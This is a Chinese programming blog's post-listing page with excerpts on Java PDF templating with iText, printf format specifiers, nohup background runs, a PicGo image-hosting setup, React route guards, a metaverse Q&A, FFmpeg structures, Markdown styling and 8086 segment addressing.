<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0684bc61389e5f258b149157681057e9/" rel="bookmark">
			Java 创建pdf
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、常用根据模板创建pdf两种方式 （创建**.ftl模板**）文本复制到word -&gt; 转html -&gt; 写好模板参数 -&gt; 转成.ftl
（使用模板）获取.ftl文件 -&gt; 填充参数 -&gt; 转html -&gt; 创建pdf 将要生成pdf的文本复制到word，在要填充参数的地方写上${}(FTL语法)，再转换成html(这里注意不要用word自带的另存为转成html，会出现字符编码、缺少标签等很多的问题)，将html文件的后缀改成.ftl，这样这个.ftl文件就是搞好的pdf模板了。
直接创建pdf模板，使用Adobe Acrobat DC工具给pdf填充文本域，保存后即为模板。（使用模板）获取pdf模板 -&gt; 填充参数 -&gt; 创建pdf 这篇文章就先只介绍方式2(pdf模板创建pdf)
二、使用pdf模板创建pdf 1.创建PDF模板 工具资源https://download.csdn.net/download/qq_43647116/46414910
我使用的是Adobe Acrobat DC工具，以下操作为该软件的流程。
1.将要制作为模板的pdf用Adobe Acrobat DC打开，如下界面。
2.找到并点击准备表单，工具 -&gt;表单和签名-&gt;准备表单，点击后选择开始即可。
3.添加文本域
工具会自动查找需要添加文本域的地方，还是挺智能的，也可以手动添加。如果添加图片，也要使用文本域，虽然有个图片域，但是使用图片域添加图片不能对图片进行缩放。
4.保存后就是项目中要用的pdf模板啦。
Java实现代码 所需依赖
&lt;dependency&gt; &lt;groupId&gt;com.itextpdf&lt;/groupId&gt; &lt;artifactId&gt;itextpdf&lt;/artifactId&gt; &lt;version&gt;5.5.13.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.itextpdf/itext-asian --&gt; &lt;dependency&gt; &lt;groupId&gt;com.itextpdf&lt;/groupId&gt; &lt;artifactId&gt;itext-asian&lt;/artifactId&gt; &lt;version&gt;5.2.0&lt;/version&gt; &lt;/dependency&gt; 代码
public class CreatePdf { public static void main(String[] args) throws Exception { createPdf(); } /** * Adobe Acrobat Pro DC 创建模板 * * @throws Exception */ public static void createPdf() throws Exception { // 填充创建pdf PdfReader reader = null; PdfStamper stamp = null; String pdfTemplatePath = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0684bc61389e5f258b149157681057e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1f6604542001a3ac2885cd69d13953c/" rel="bookmark">
			浅谈%d, %ld, %lld 区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		浅谈%d, %ld, %lld 区别 程序之美 32位和64位的操作系统区别
1.内存不同
32位操作系统，最多支持4G的内存，实际内存为3.25G；64位系统支持4G 8G 16G 32G 64G 128G 256G内存，理论上可以无限多个，只要你主板能够插入足够的内存条。
2.处理器不同
64位的操作系统支持基于64位的处理器，而32位的系统却不能完全支持64位的处理器。
3.软件不同
32位的操作系统，仅支持32位的软件，不支持运行64位的软件；而64位的操作系统两种类型的都支持，
%d 输出的是 int,
%ld 输出的是 long,
%lld 输出的是 long long;
32位编译器：
int 4字节
long 4字节
long long 8字节
64位编译器:
int 4字节
long 8字节
long long 8字节
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/163abefd29a93f1bf3f80c57b8feacd4/" rel="bookmark">
			技术手册大全（部分）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		计算机技术手册大全 拿来给后人指路用的
python手册 python初级手册https://docs.pythontab.com/learnpython/python进阶手册https://docs.pythontab.com/interpy/python2手册https://docs.pythontab.com/python/python2.7/python3手册https://docs.pythontab.com/python/python2.7/ 前端三件套手册 HTML手册 https://www.php.cn/course/27.htmlHTML5手册 https://www.php.cn/course/34.htmlCSS手册 https://www.runoob.com/css/css-tutorial.htmlCSS3手册 https://www.runoob.com/css3/css3-tutorial.htmlJavaScript https://zh.javascript.info/ PHP PHP手册 https://www.php.cn/course/25.htmlPHP7手册 https://www.php.cn/course/352.htmlPHP编码规范 https://www.php.cn/course/982.html C++ https://www.php.cn/course/93.html
MySQL https://www.php.cn/course/37.html
Java https://www.runoob.com/java/java-tutorial.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f78c8e30911e20f6c6696f9a124d0ad9/" rel="bookmark">
			Linux 后台运行与输出
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 nohup python flush.py &amp; 这样运行，能够生成nohup.out文件，但是内容始终是空的。具体原因：python的输出是有缓冲的，即使在py脚本中每次遍历都有打印输出，但是因为缓冲的作用，我们不能在nohup.out日志中立即看到打印的输出。
nohup python -u flush.py &gt; flush.log 2&gt;&amp;1 &amp; -u 参数，使得python不启用缓冲。
如果python带参数也是一样的
nohup python -u train4.py train_base configs/magicpoint_shapes_pair.yaml magicpoint_synth --eval &gt; nohup.out 2&gt;&amp;1 &amp; 解析：
nohup 不挂断地运行命令，忽略所有挂断信号（SIGNUP信号），比如当账号注销时。最后的&amp;：表示后台运行。nohup command &amp;，表示后台运行nohup命令。linux中的0表示标准输入，1表示标准输出，2表示标准错误输出。&gt; 表示覆盖式重定向。正常输出是把内容输出到显示器上，重定向是把内容输出到文件中。 command &gt; xxx.txt，将输出重定向到xxx文件中。&gt;&gt; 表示追加式重定向。command &gt;&gt; xxx.log，将输出重定向追加到xxx.log文件中。2 &gt; &amp;1 ，2是标准错误输出，1是标准输出，这里的&amp;表示引用的意思，对标准输出的引用。所以这个命令就表示将标准错误输出也重定向到标准输出指向的文件中。 前台实时查看nohub.out文件内容：
tail -f nohup.out 根据关键字查看
tail -f nohup.out |grep "关键字" 输出文件最后100行
tail -n 100 nohup.out 输出文件最后100行，含关键字
tail -n 100 nohup.out |grep "关键字" 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83808f46144e694b719e683dae5020da/" rel="bookmark">
			Typora&#43;PicGo&#43;Gitee配置图床
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 需要的工具 Typora——下载地址PicGo —— 下载地址 macos下.dmg，window下.exeGitee ——Gitee网址 2 配置图床 2.1 创建gitee仓库 右上角+——新建仓库——填写名称（随便起个名字）——开源（一定要开源）——设置模板Readme文件（可以帮你自动创建master）——创建
2.1.1 获取私人令牌(token) 右上角头像——设置——私人令牌——生成新令牌——提交
成功之后一定要保存好token，只会出现一次，忘记了只能删了重建或者更新
2.2 配置PicGo 尽量不要将PicGo安装于路径C:\Program Files\下，建议更换路径
2.2.1 安装插件 在PicGo的插件设置中搜索gitee，安装gitee-uploader
安装完毕，就可以看到 gitee图床
2.2.2 配置插件 repo处填写仓库位置，gitee中仓库对应的网址为gitee.com/仓库位置
token处填写之前申请的私人令牌
2.3 配置Typora 打开Typora——文件——偏好设置——图像
建议插入图片时复制到指定路径
一、是方便管理图片
二、是选择上传图片我们将无法直接粘贴剪切板中的图片
至此，所有配置已经完成
点击验证图片上传选项用来测试是否可用
3 上传不成功 错误原因解决Failed to fetch监听端口与Typora不同在PicGo设置中修改Server端口为36677{“success”,false}文件名冲突或者插件有问题换一个插件试试 PicGo相册功能 通过PicGo的相册功能对已上传图片进行删除、复制和编辑：此操作会同步到床图
参考： [1]Typora+PicGo+Gitee搭建博客写作环境（超详细）
[2]使用Typora+PicGo+gitee搭建图床写文章
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0061ec10cdb343b52ea68b7e951c68e7/" rel="bookmark">
			React-路由守卫 访问控制-Route组件的render
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目标 当login跳转到lindex的时候，需要判断这次跳转是否登录是否有权限进入。(鉴权/路由守卫)
1.Route的上使用render格式 Route的作用是当path匹配成功时，加载显示对应的组件
格式：
&lt;Route path="/login" component={组件}&gt; 或者：
通过render回调函数把组件return出去
尽然是函数就可以写逻辑操作了 &lt;Route path="/login" render={() =&gt; { return &lt;组件/&gt;} }&gt; 2.render的基本使用 实例代码：
&lt;Route path="/home" render={()=&gt;{ //1.判断localStorage里面是否有token const token = !!localStorage.getItem('token') //2. 判断 if(token) {// 如果有就return Layout组件 return &lt;Layout&gt;&lt;/Layout&gt; } else { // 否则就重定向去 login return &lt;Redirect to="/login"&gt;&lt;Redirect&gt; } } 3. 访问控制-组件封装 将访问控制封装成组件方便，方便复用与维护
import React from 'react' import { Route, Redirect } from 'react-router-dom' // 我们需要解构所有的属性，除了component属性 export default function PrivateRoute(props) { // 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0061ec10cdb343b52ea68b7e951c68e7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1448f7023a6d3018fa881d92e68675cd/" rel="bookmark">
			元宇宙十问十答：元宇宙会成为灾难让世界走向灭亡吗？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		近段时间，元宇宙概念可谓席卷了各位的微信和朋友圈，仿佛不懂元宇宙就不好意思去跟别人来聊天，连Facebook也借着这股风向，一举将公司名改成了Meta；那元宇宙到底什么？现在大家讨论的元宇宙离我们还有多远？Meta的「诞生」对扎克伯格意味着什么？元宇宙会让我们变得更美好吗？
本期腾讯新闻《十问十答》将围绕元宇宙概念，来为大家进行深度的解答。
1
Meta为什么会成为第一家宣布转型元宇宙的大型科技公司，有哪些方面的优势？
Meta（Facebook更名）作为老牌社交平台，在全球吸引了近30亿用户的注册使用，最新的季度财报显示，Meta的日活用户高达19.3亿，尽管看起来数据傲人，实际上却是近两年的新低，同时Meta一直饱受隐私数据泄露问题的困扰。如何在竞争者日益增多、内忧外患的情况下破局成为了当前Meta所关注的焦点。
因此作为《雪崩》迷的扎克伯格将目光放在了元宇宙之上，早在2014年，Meta就收购了Oculus VR，开始了在元宇宙的布局。扎克伯格始终相信，元宇宙最终将涵盖工作、娱乐以及生产生活中的一切，就像今天的手机和笔记本电脑一样，平台需要足够的灵活性来适应所有的用例，而这一切都需要软硬件的配合与时机。
当前由于全球疫情的影响，导致了用户对于多元化的虚拟经济以及存在感的需求增加，为元宇宙的发展提供了先决条件。作为第一家宣布转型元宇宙的大型科技公司，Meta具有庞大的用户基础、行业内最顶尖的硬件设备和多元化的软件体系，以及最重要的也是不可或缺的——对于元宇宙的理解。
也许很多人都认为Meta所说的元宇宙并不是真实的元宇宙，它有着中心化的弊端，不过是一个大型的集成式应用场景。但是Meta有句话说的无疑是对的，“元宇宙中的一切并不是我们建造的，而是我们在为元宇宙建造这一切”，显然，Meta已经为此做好了准备。
2
用户在元宇宙的世界里，可以得到哪些和现在完全不一样的体验？
或许很多对元宇宙不太了解的用户会认为，元宇宙就是虚拟世界，或者是类似于《虚拟人生》一样的游戏，可是究其本质，元宇宙与这两者有着截然不同的特性。元宇宙有着可信的资产价值、去信任的身份认证，以及虚拟世界对现实世界一切生产生活方式的复刻及升级。
也就是说，用户在元宇宙中可以获得各种经历，建立具有创造性的经济体系，可以身临其境的去体验，而不再只是互联网中的看客，一切链接社交娱乐的工作会变得更加自然和生动。
在元宇宙中，我们会感觉社交不再隔着屏幕，我们和其他人都是真实存在的，元宇宙让用户的世界超越了屏幕的限制、地理的限制、平台的限制，在网络中拥有更大的自由。
每一个用户都具有独一无二的虚拟形象，和元宇宙中的其他人进行自由的交互，其巨大的沉浸感甚至可能让用户难以区分元宇宙与现实世界的区别，当然，这需要借助特定的装备才能实现元宇宙与现实之间的转换。
现实中任何细微的动作都可能影响其在元宇宙中的虚拟形象，而不再是当前大多数VR头显带给我们的略显僵硬的动作映射，元宇宙会对现实生活中的一切生产生活动进行完美的复刻，并让用户可以随时随地穿梭于现实和这个虚拟世界。
同时元宇宙还会有自成体系的经济系统，甚至它会有独特的经济体系，每个人都是自己元宇宙的中心，并在其中诞生新的维持元宇宙运行的道德规范。
以上这些都是当前网络无法为用户提供的。
3
元宇宙会成为下一代互联网吗？
从发展逻辑来说元宇宙更有可能是互联网的终极形态，而下一代互联网会达到元宇宙初级形态所需要的一些基础，为此我们得明白现在的互联网发展成为什么样了。
第一代互联网是Web1.0，属于是可读互联网，人们只能阅读网站上提供的信息，比较有代表性的是搜索网站，门户网站等等。
第二代互联网是Web2.0，属于是交互互联网，人们可以自由的在网站上发布内容与他人进行互动。目前我们正身处在这个阶段的互联网，Facebook、微信、微博、Bilibili等都是属于这一代互联网的典型应用。
而关于下一代互联网是什么样子，或者说Web3.0是什么样子，目前还没有一个公认的概念，比较有共识的是两种Web3.0的理解。
一种是网站可以通过用户的行为，开始学习和分析，变得更加智能，主要特征是，机器能读懂任何信息（也就是语义网），网站根据信息提供智能删选和提供更好的信息（人工智能），互联网无处不在（物联网）。另一种Web3.0则认为下一代互联网会是一个去中心化的互联网，并且每个人都能掌握自己的（数字）身份、资产和数据，进而掌握自己的命运。
尽管围绕着Web3.0的概念众说纷纭，但还没有形成定局。不过从这两种Web3.0所描述的发展来看，都不足以使我们能达到元宇宙的阶段。但是这两种Web3.0都拥有成为元宇宙所必须的功能。所以，元宇宙不会是下一代互联网，还需要一代一代互联网进一步发展迭代最终才能形成我们所期望的元宇宙。
不过，下一代互联网已经在为元宇宙打基础了，尤其是得益于区块链技术的高速发展，去中心化的网络正在逐渐构建起来，可以保障我们在网络上的数字资产和权益是属于我们自身的，并且不会被随意篡改。如此看来，第二种Web3.0更有可能成为下一阶段的互联网，也将会形成出元宇宙的初级形态。
4
元宇宙是一个遥远的概念，还是数年内就能席卷到普通人的事情？
从Roblox公司作为元宇宙第一股上市，到Facekbook高调改名为Meta，元宇宙的概念已经一步一步的走进大众的视野。尽管目前元宇宙对于普通人来说还只能凭借想象力来定义，但是从互联网发展的规律来看，元宇宙在数年内实现的可能性还是很大的。
我们来简单回顾下互联网的重要发展阶段：1994年-2000年，从四大门户到网络搜索；2001年-2008年，从搜索到社交化网络；2009年-2014年；PC互联网到移动互联网；2014年-至今，万物互联，而数据显示，截止2021年5月，我国移动用户高达16.08亿，截止同年6月，我国网民规模达10.11亿。
透过上面的数据我们可以直观的看到，互联网的发展速度越来越快，元宇宙作为互联网的“升级版”不会减速只会加速。
同时每一次变革都拉进了人与物的连接，也逐渐丰富了人们在虚拟世界的体验。科幻小说之父凡尔纳说过：但凡人能想象到的事物，必定有人能将它实现。2004年大火的科幻电视剧《魔幻手机》，那部从2060年穿越而来的智能手机有六大功能：光能充电、扫描信息、视频通话、测谎仪、屏蔽信息、真人模式，在2021年的今天已经实现了一大半，那些想象的画面都已成为了现实。
在今年的腾讯WE大会上，6位全球顶尖科学家分享了他们在科技领域的突破，其中就包括元宇宙重要的脑机接口技术。虽然当前实现元宇宙还有技术、网络等层面的问题尚未突破，但是基于现在互联网的基础，迈入新的阶段只会更快。
5
元宇宙对于哪些领域影响最大，办公，游戏是最大的吗？
据了解，Meta正在拓展居家、社交、工作、健身、游戏、教育、宠物和交易8个领域的应用场景，这些场景基本涵盖了我们日常的工作和生活，而微软的元宇宙战略主要从数字化写作办公，帮助管理者了解客户、员工在空间层面的移动或互动方式两个角度落地。
因此，元宇宙最终会从各个方面影响到我们的生活，就如同当年智能手机的迅速发展一样，到如今，智能手机已经从各个方面影响着我们的生活与工作，成为了不可或缺的工具。
当然，AR/VR作为元宇宙的入口，也是元宇宙沉浸感的关键，游戏作为视觉沉浸最好的载体，受到相关的影响最大，这也是为什么当前AR/VR对普通受众感知最大的还是游戏的原因。
另外，元宇宙中最重要的是虚拟身份的建立，多人的实时互动将会为社交与办公带来全新的体验，现实世界与虚拟世界的界限也会逐渐弱化，甚至我们的运动方式、社交形态等方面都会有所变化。
短期来看，元宇宙的实现还需要各个技术的突破以及融合，但从长期来看，沉浸式虚拟互动生活方式必然会成为一种趋势，甚至赛博朋克的文化会被发扬光大，与我们手中的智能手机一样，除了带给人类一种新的生活方式，还将改变我们的世界观。
6
现在的硬件和软件，是否已经能足够支持元宇宙的世界了？
元宇宙的爆红带动了资本疯狂涌入相关行业，我们见证了太多超亿元的融资。VR硬件厂商Pico完成了2.42亿人民币B+轮融资、沙盒移动平台开发商MetaApp宣布完成1亿美元C轮融资、电子游戏开发商Epic Games完成10亿美元巨额融资。一桩桩融资事件似乎都在表明，元宇宙的软硬件都在飞速发展。
然而当前的硬件和软件，实际上还不足以支持元宇宙的世界，元宇宙很难凭借单一技术的突破而达到某个里程碑事件，元宇宙还仅仅是一个雏形。
当前元宇宙行业比较公认的基础设施是“BAND”，也就是Blockchain（区块链）、Game（游戏化）、Network（网络计算）、Display（显示），而每一个领域都有着重要的细分赛道，需要进一步的发展。
无论是区块链领域的应用、底层基础设施、智能合约、资产标准、隐私计算；还是游戏化中的游戏引擎、实时渲染、建模技术、人工智能；或者网络计算相关的网络传输、计算、硬件；以及显示相关的VR/AR/MR、体感技术、全息影像、物联网与智能硬件、脑机交互，都是完善元宇宙必不可少的部分。
而我们列举的这18项有可能只是元宇宙领域的冰山一角，元宇宙的构建需要多技术的协同发展到一定程度后才能实现。
然而好在，作为新兴赛道的元宇宙领域被各个技术领域顶尖的公司所接纳并得到了资本的认可，这为未来元宇宙的发展带来了动力。
7
刘慈欣认为，元宇宙是人类的一场内卷，人类沉溺于元宇宙的虚拟世界，将成为一种灾难，怎么看待这个说法？
作为中国最著名的科幻作家，刘慈欣的作品一直充满了悲壮的英雄主义，反乌托邦和对人性的批判是其作品的核心，这一切在《三体》中有着充分的体现，也是大家最不陌生的部分。
因此当元宇宙的浪潮袭来，他的观点也充满了悲观主义，然而他并不是反对元宇宙，刘慈欣同样也说过，“人类的面前有两条路，一条向外，通往星辰大海；一条向内，通往虚拟现实。”他深刻且清晰的明白，元宇宙所代表的虚拟现实是未来的生活场景，他的说法更多的是表示一种担忧。
但这些都是对娱乐至死的担忧，对《美丽新世界》描绘的世界成为现实的担忧，对人性中的弱点的担忧，所以我们认为，刘慈欣批判的不是元宇宙，他批判的是人性，他认为元宇宙是极具诱惑、高度致幻的“精神鸦片”，人类或许会沉溺其中而固步自封。
同时刘慈欣也担心如果人类资源和精力过度的放在元宇宙中，那么对于星际的探索会不会有所停滞。他一直认为，“不管地球达到了怎样的繁荣，那些没有太空航行的未来都是暗淡的”，人类远行的终点应该在物理空间的知识水平和改造水平之上。
刘慈欣是一位神预言了诸多科技成果的科幻作家，他的观点无疑是举足轻重的，但是他似乎忽略了一个很关键的问题，当前的技术尚不足以支撑元宇宙世界的成熟稳定运行，相反元宇宙的浪潮促进了有关技术的跃进。
元宇宙的到来将《安德的游戏》中的模拟星际大战变成现实，难道不是从另一个方面促进了对星际探索的准备吗？就目前来看，元宇宙的热潮是利大于弊的。
8
我们距离真正的元宇宙时代还有多远，还需要搭建哪些技术设施？
支撑元宇宙的技术有很多，我们不妨从元宇宙的现实基础、与元宇宙交互、建造元宇宙、以及保障元宇宙的价值四个方面来看。
首先是元宇宙并不能独立于现实世界存在，它需要有大量的硬件基础设施为元宇宙提供存储，计算和网络传输等资源。但是现有的这些技术还远达不到元宇宙那样体量庞大的数据处理要求。因此，需要进一步迭代相应的存储技术、网络传输技术和计算技术，这其中自然也包括硬盘、CPU、GPU等硬件的迭代。
其次，有了这些底层基础设施，我们还需要在现实世界中能感知元宇宙，并与之互动，这就离不开物联网技术和交互技术。
物联网包括智能硬件等硬件设施设备，还包括让设备之间能互相联通的物联网络，以及让不同设备能统一协作的标准或者说是系统。
而交互技术则包括VR/AR/MR/XR，以及全息投影，动作捕捉，体感技术等，能让我们体验元宇宙，与元宇宙中的事物进行交互，甚至获得来自元宇宙中带来的真实触感和反馈（比如一些体感衣就能将我们的虚拟形象在元宇宙中所感受到的物理冲击转化为较为真实的物理反馈）。
虽然我们目前已经有一些能与元宇宙交互的技术了，但是还要考虑到元宇宙本身的建造问题。而这就需要一些能够建造元宇宙的游戏引擎、实时渲染、建模技术等软硬件类的技术，同时庞大的元宇宙的构建工作如果全靠人工是不现实的，这就离不开人工智能的发展，人工智能可以帮助我们快速构建元宇宙，甚至能成为元宇宙中的一些辅助性虚拟人物。
而最后还需要区块链技术来保障元宇宙的价值，区块链的不可篡改和去中心化等特性，结合智能合约技术，可以保障我们在元宇宙中的数字资产是属于我们个人的，并且不会被某个中心化主体所控制。这种特性尤为重要，因为如果我们所处的元宇宙是能被某个中心化主体随意操控，那么我们在其中的体验会觉得这只是一种游戏；而如果这个元宇宙是去中心化的，我们的资产是确实属于我们自己的，谁也拿不走，那么我们在其中的体验会觉得这是一种真正的生活。
9
元宇宙会让现实社会的人与人关系更加疏远吗？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1448f7023a6d3018fa881d92e68675cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a61ae7b90ebe7af7f75c505defb1d78a/" rel="bookmark">
			视频入门系列-FFmpeg篇（FFmpeg结构体分析）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通过之前的学习，我们知道了如何通过调用FFmpeg代码来进行解码和编码，正所谓知其然还要知其所以然，这篇文章分析下FFmpeg编解码过程中主要的结构体，通过对这些结构体的分析，可以更好的理解FFmpeg的编解码过程。
1.FFmpeg结构体分析
通过之前对于FFmpeg进行解码、编码的代码学习，我们总结FFmpeg结构体主要分为三个层次：协议层（AVIOContext）、封装层（AVInputFormat）、解码层（AVStream）。具体如下
2.FFmpeg编解码关键结构体
按照FFmpeg编解码时代码的调用过程，笔者总结有八个关键结构体。本文按照编解码调用顺序介绍如下：
2.1AVFormatContext：描述媒体文件或媒体流的构成和基本信息，贯穿ffmpeg使用整个流程
AVInputFormat *iformat、AVOutputFormat *oformat：输入或者输出流的格式（只能存在一个） AVIOContext *pb：管理输入输出数据 unsigned int nb_streams：音视频流的个数 AVStream **streams：音视频流 char *url：文件名 int64_t duration：时长 int bit_rate：比特率（单位bite/s） AVDictionary *metadata：元数据（查看元数据：ffprobe filename） 2.2.AVInputFormat：文件的封装格式
char* name：封装格式的名字 char* long_name：封装格式的长名字 char* extensions：文件扩展名 2.3AVIOContext-&gt;URLContext-&gt;URLProtocol
◆ 2.3.1 AVIOContext：文件（协议）操作的顶层对象
unsigned char *buffer：缓冲开始位置 int buffer_size：缓冲区大小（默认32768） unsigned char *buf_ptr：当前指针读取到的位置 unsigned char *buf_end：缓存结束的位置 void *opaque：URLContext结构体 (*read_packet)(...)：读取音视频数据的函数指针 (*write_packet)(...)：写入音视频数据的函数指针 (*read_pause)(...)：网络流媒体协议的暂停或恢复播放函数指针 ◆ 2.3.2 URLContext：每种协议，有一个协议操作对象和一个关联的协议对象
char* name：协议名称 const struct URLProtocol *prot：协议操作对象（ff_file_protocol、ff_librtmp_protocol...） void *priv_data：协议对象（FileContext、LibRTMPContext） ◆ 2.3.3 URLProtocol：协议操作对象
2.4 AVStream：存储音频流或视频流的结构体
int index：音频流或视频流的索引 AVRational time_base：计算pts或dts是使用的时间戳基本单位（显示时间：pt = av_q2d(video_stream-&gt;time_base) * frame-&gt;pts） int64_t duration：该视频/音频流长度 AVRational avg_frame_rate：平均帧率（对于视频来说，frame_rate=avg_frame_rate.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a61ae7b90ebe7af7f75c505defb1d78a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac803fa95b87b6d204f90757938b1881/" rel="bookmark">
			MarkDown的使用简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MarkDown的使用简介 1、MarkDown概述 1.1、什么是MarkDown MarkDown是一种轻量级标记语言，使用易读易写的纯文本格式编写文档。
2004年由约翰·格鲁伯创建。使用MarkDown编写的文档可以导出HTML、Word、图像、PDF、Epub等多种格式的文档。MarkDown编写的文档，后缀名为.md或.markdown。
当前许多网站都广泛使用 Markdown 来撰写帮助文档或是用于论坛上发表消息。甚至一些软件也集成了MarkDown功能，比如：有道云、VSCode、简书、Github、CSDN等都支持Markdown写作。甚至vuepress也支持部分Markdown（部分语法）搭建博客页面。
1.2、MarkDown编辑器 1）Typora编辑器；
2）Visual Studio Code
3）在线编辑：在线markdown编辑器_微信公众号markdown排版工具
Typora编辑器快捷键：
1）标题 (快捷键：ctrl + 数字)
2）表格：（ctrl + T）
2、MarkDown基本语法 基础语法参考：我的文章
3、MarkDown高级语法 3.1、设置字体样式 1）设置字体颜色 &lt;font face="黑体"&gt;我是黑体字&lt;/font&gt; &lt;font face="微软雅黑"&gt;我是微软雅黑&lt;/font&gt; &lt;font face="STCAIYUN"&gt;我是华文彩云&lt;/font&gt; &lt;font color=red&gt;我是红色&lt;/font&gt; &lt;font color=#008000&gt;我是绿色&lt;/font&gt; &lt;font color=Blue&gt;我是蓝色&lt;/font&gt; &lt;font size=5&gt;我是字体大小&lt;/font&gt; &lt;font face="黑体" color=green size=5&gt;我是黑体，绿色，字体大小为5&lt;/font&gt; 2）设置表格背景色 &lt;table&gt;&lt;tr&gt;&lt;td bgcolor=yellow&gt;背景色yellow&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; 3）设置文字居中 &lt;center&gt;居中&lt;/center&gt; &lt;p align="left"&gt;左对齐&lt;/p&gt; &lt;p align="right"&gt;右对齐&lt;/p&gt; 4）加入上下标 双氧水：H&lt;sub&gt;2&lt;/sub&gt;O&lt;sub&gt;2&lt;/sub&gt; 二氧化碳：CO&lt;sub&gt;2&lt;/sub&gt; 案例1效果：
我是黑体字 我是微软雅黑 我是华文彩云 我是红色 我是绿色 我是蓝色 我是尺寸 我是黑体，绿色，尺寸为5
案例2效果：
案例3效果：
案例4效果：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac803fa95b87b6d204f90757938b1881/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9af3e93713f239e253c0d187ce0f4334/" rel="bookmark">
			那些年踩过的坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		nginx配置文件不生效 一直在对解压目录的配置文件进行修改，实际运行的是安装目录中nginx.
测试接口返回空 注意字符串类型的入参带不带空格
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f4e15e8fdc992b97ca43ab8a38180a22/" rel="bookmark">
			物理地址是怎么确定的？以8086为例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		物理地址 我们知道，CPU 访问内存单元时，要给出内存单元的地址。所有的内存单元构成的存储空间是一个一维的线性空间，每一个内存单元在这个空间中都有唯一的地址，我们将这个唯一的地址称为物理地址。
8086是16位结构的CPU，这也就是说，在8086内部，能够一次性处理、传输、暂时存储的信息的最大长度是16位。内存单元的地址在送上地址总线之前，必须在CPU中处理、传输、暂时存放。
而上一篇我们讲到，地址总线的宽度决定CPU的寻址能力。8086有20根地址总线，可以传送20位地址，所以其寻址能力为2^20B，即1M。
很自然地，这里产生了矛盾：如果只是简单地将地址从内部发出，那么8086只能发出16位的地址，表现的寻址能力也就只有2^16byte，即64KB。这这与1M的寻址能力不符！
那么如何解决该矛盾呢？
在正式讨论之前，我们换一个话题。如下图所示，假如大熊要去图书馆，询问胖虎图书馆的具体位置（物理地址），于是胖虎告诉他：
（1）你可以从从学校走2826米能到图书馆；
（2）也可以从学校走2000米到体育馆，再走826米就是图书馆。
显然，两种方式大熊都能找到图书馆的位置。
那么现在加一些限制条件，比如大熊和胖虎之间用如下的方格纸进行通信，那么按照第一种方式直接写入2826表示图书馆的位置就能准确定位。
如果现在再加一个限定条件：假如方格个数只有三个，如何才能定位图书馆的位置呢？
只能采用第二种方式咯：先找到体育馆，再通过偏移的826米找到图书馆。
概括表述为：先用200米表示起始位置，我给它起个名字叫段地址，将200米乘以10的位置我们叫它基地址，基地址再加上偏移位置826米，正好是2826米，也就是图书馆的位置！
好了，我们再回到8086CPU确定物理地址的方式上来，根据上面的例子我们就能解决CPU内部与数据总线的矛盾。8086CPU采用一种在内部用两个16位地址合成的方法来形成一个20位的物理地址。
